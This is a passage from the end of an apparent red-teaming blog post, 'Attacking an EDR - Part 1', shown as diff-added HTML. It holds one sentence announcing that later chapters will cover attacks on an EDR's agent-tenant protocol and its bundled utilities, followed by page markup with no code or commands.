+In the following chapters, we will demonstrate how it is sometimes possible to attack these solutions in their communication protocol between the agent and tenant, and how it is also feasible to target the individual utilities that these products often keep ready for use in the system where they are installed, in the form of portable executables.</p>
+
+
+      </article>
+
+      
+        <div class="blog-tags">
+          Tags:
+          
+          
+            <a href="https://riccardoancarani.github.io/tags#red-teaming">red-teaming</a>
+          
+          
+        </div>
+      
+
+      
+        <!-- Check if any share-links are active -->
+
+
+
+
+<section id="social-share-section">
+  <span class="sr-only">Share: </span>
+
+  
+  <!--- Share on Twitter -->
+    <a href="https://twitter.com/intent/tweet?text=Attacking+an+EDR+-+Part+1&amp;url=https%3A%2F%2Friccardoancarani.github.io%2F2023-08-03-attacking-an-edr-part-1%2F" class="btn btn-social-icon btn-twitter" title="Share on Twitter">
+      <span class="fa fa-fw fa-twitter" aria-hidden="true"></span>
+      <span class="sr-only">Twitter</span>
+    </a>
+  
+
+  
+  <!--- Share on Facebook -->
+    <a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Friccardoancarani.github.io%2F2023-08-03-attacking-an-edr-part-1%2F" class="btn btn-social-icon btn-facebook" title="Share on Facebook">
+      <span class="fa fa-fw fa-facebook" aria-hidden="true"></span>
+      <span class="sr-only">Facebook</span>
+    </a>
+  
+
+  
+  <!--- Share on LinkedIn -->
+    <a href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3A%2F%2Friccardoancarani.github.io%2F2023-08-03-attacking-an-edr-part-1%2F" class="btn btn-social-icon btn-linkedin" title="Share on LinkedIn">
+      <span class="fa fa-fw fa-linkedin" aria-hidden="true"></span>
+      <span class="sr-only">LinkedIn</span>
+    </a>
+  
+
+</section>
+
+
+
+      
+
+      <ul class="pager blog-pager">
+        
+        <li class="previous">
+          <a href="https://riccardoancarani.github.io/2023-07-31-mockingjay-what-is-old-is-new-again/" data-toggle="tooltip" data-placement="top" title="Mockingjay - What is old is new again">← Previous Post</a>
+        </li>
+        
+        
+        <li class="next">
+          <a href="https://riccardoancarani.github.io/2023-09-14-attacking-an-edr-part-2/" data-toggle="tooltip" data-placement="top" title="Attacking an EDR - Part 2">Next Post →</a>
+        </li>
+        
+      </ul>
+
+      
+        <div class="disqus-comments">
+          
+        </div>
+          
+        <div class="staticman-comments">
+          
+
+        </div>
+        <div class="justcomments-comments">
+          
+        </div>
+      
+    </div>
+  </div>
+</div>
+
+
+    
+
+  
+    
+
+
+  
+    <!-- doing something a bit funky here because I want to be careful not to include JQuery twice! -->
+    
+      
+    
+  
+    <!-- doing something a bit funky here because I want to be careful not to include JQuery twice! -->
+    
+      
+    
+  
+    <!-- doing something a bit funky here because I want to be careful not to include JQuery twice! -->
+    
+      
+    
+  
+
+
+
+
+
+
+  
+  
+
+</body></html>
